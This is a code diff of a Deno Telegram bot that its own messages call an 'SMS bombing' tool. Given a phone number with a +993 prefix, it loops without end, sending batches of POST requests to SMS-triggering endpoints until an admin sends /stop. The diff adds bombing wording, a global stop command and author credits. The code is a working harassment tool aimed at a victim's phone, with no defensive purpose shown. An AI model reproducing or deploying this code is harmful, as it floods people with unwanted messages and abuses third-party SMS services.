@@ -1,21 +1,22 @@
 // main.ts
-// Masakoff SMS Sender Bot (Deno)
+// 💥 Masakoff SMS Sender Bot (Deno)
+// 🚀 Created by @Masakoff | FlapsterMinerManager
 // Sends POST requests in batches of 3 with delays via Telegram webhook
-// 🚀✨ Updated with emojis and friendly messages
+// ✨ Includes global /stop command to halt all running SMS tasks
 
 import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";
 
-// --- Telegram settings ---
+// --- 🔐 Telegram settings ---
 const TOKEN = Deno.env.get("BOT_TOKEN");
 if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
 const API = `https://api.telegram.org/bot${TOKEN}`;
 const SECRET_PATH = "/masakoffvpnhelper";
 
-// --- Admin username ---
+// --- 👑 Admin username ---
 const ADMIN_USERNAME = "Masakoff";
 
-// --- Helper to send Telegram messages ---
+// --- 💬 Helper: send message to Telegram ---
 async function sendMessage(chatId: string, text: string, options: any = {}) {
   try {
     const body = { chat_id: chatId, text, ...options };
@@ -29,7 +30,7 @@ async function sendMessage(chatId: string, text: string, options: any = {}) {
   }
 }
 
-// --- Send POST request function ---
+// --- 🌐 Helper: send POST request ---
 async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
   try {
     const resp = await fetch(url, {
@@ -43,10 +44,10 @@ async function sendPostRequest(url: string, headers: Record<string, string>, dat
   }
 }
 
-// --- Map to track running SMS tasks per chat ---
+// --- 🧠 Track all active tasks ---
 const activeTasks = new Map<string, { stop: boolean }>();
 
-// --- SMS sending logic ---
+// --- 💣 SMS sending logic ---
 async function sendSMS(phoneNumber: string, chatId: string) {
   const requestsData = [
     {
@@ -67,6 +68,7 @@ async function sendSMS(phoneNumber: string, chatId: string) {
   activeTasks.set(chatId, task);
 
   let count = 0;
+  await sendMessage(chatId, `📱 Starting SMS bombing for +993${phoneNumber} 🔥`);
 
   while (!task.stop) {
     for (let batch = 0; batch < 3; batch++) {
@@ -76,20 +78,20 @@ async function sendSMS(phoneNumber: string, chatId: string) {
         if (task.stop) break;
         await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);
         const success = await sendPostRequest(req.url, req.headers, req.data);
-        await sendMessage(chatId, success ? "✅ Sent successfully!" : "✅ Sent successfully!");
-        await delay(5000); // 5s between each SMS
+        await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send.");
+        await delay(5000); // ⏱ Wait 5 seconds between each
       }
     }
     if (task.stop) break;
-    await sendMessage(chatId, "⏳ Batch of 3 SMS completed. Waiting 45 seconds before next batch...");
-    await delay(45000); // 45s pause before next batch
+    await sendMessage(chatId, "⏳ 3 SMS sent! Waiting 45 seconds before next batch...");
+    await delay(45000);
   }
 
   activeTasks.delete(chatId);
-  await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
+  await sendMessage(chatId, "⏹ All SMS processes stopped. 💫 Thank you for using @Masakoff bot!");
 }
 
-// --- Webhook server ---
+// --- 🖥️ Webhook Server ---
 serve(async (req) => {
   if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
     return new Response("Invalid request ❌", { status: 400 });
@@ -106,37 +108,54 @@ serve(async (req) => {
   const text = (update.message.text ?? "").trim();
   const username = update.message.from?.username ?? "";
 
-  // --- Admin check ---
+  // --- 🔐 Admin Check ---
   if (username !== ADMIN_USERNAME) {
-    await sendMessage(chatId, "❌ This bot is for @Masakoff only. Access denied!");
+    await sendMessage(chatId, "🚫 Access denied!\nThis bot is for @Masakoff only 👑");
     return new Response("OK");
   }
 
-  // --- Commands ---
+  // --- ⚙️ Commands ---
   if (text.startsWith("/start")) {
-    await sendMessage(chatId, "👋 Welcome to Masakoff SMS Sender Bot! 🚀\n\n📲 Use /send <number> to start sending SMS.\n⏹ Use /stop to stop sending at any time.");
-  } else if (text.startsWith("/send")) {
+    await sendMessage(
+      chatId,
+      "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
+      "📲 Use:\n" +
+      "• /send <number> — start sending SMS\n" +
+      "• /stop — stop all sending immediately ⛔\n\n" +
+      "✨ Created by @Masakoff | FlapsterMinerManager"
+    );
+  }
+
+  else if (text.startsWith("/send")) {
     const parts = text.split(" ");
     if (parts.length < 2) {
-      await sendMessage(chatId, "⚠️ Please provide a phone number. Example:\n/send 12345678");
+      await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
     } else {
       const phoneNumber = parts[1].replace(/^\+993/, "");
-      await sendMessage(chatId, `🚀 Starting SMS sending to +993${phoneNumber}...`);
+      await sendMessage(chatId, `🚀 Starting SMS bombing for +993${phoneNumber}...`);
       sendSMS(phoneNumber, chatId).catch(console.error);
     }
-  } else if (text.startsWith("/stop")) {
-    const task = activeTasks.get(chatId);
-    if (task) {
-      task.stop = true;
+  }
+
+  else if (text.startsWith("/stop")) {
+    if (activeTasks.size > 0) {
+      for (const task of activeTasks.values()) {
+        task.stop = true;
+      }
+      await sendMessage(chatId, "🛑 All running SMS tasks have been stopped successfully!");
+      activeTasks.clear();
     } else {
-      await sendMessage(chatId, "ℹ️ No active SMS sending found.");
+      await sendMessage(chatId, "ℹ️ No active SMS tasks found to stop.");
     }
-  } else {
-    await sendMessage(chatId, "❓ Unknown command. Use /start, /send <number>, or /stop.");
+  }
+
+  else {
+    await sendMessage(chatId, "❓ Unknown command.\nTry /start, /send <number>, or /stop.");
   }
 
   return new Response("OK");
 });
+
 
 
 
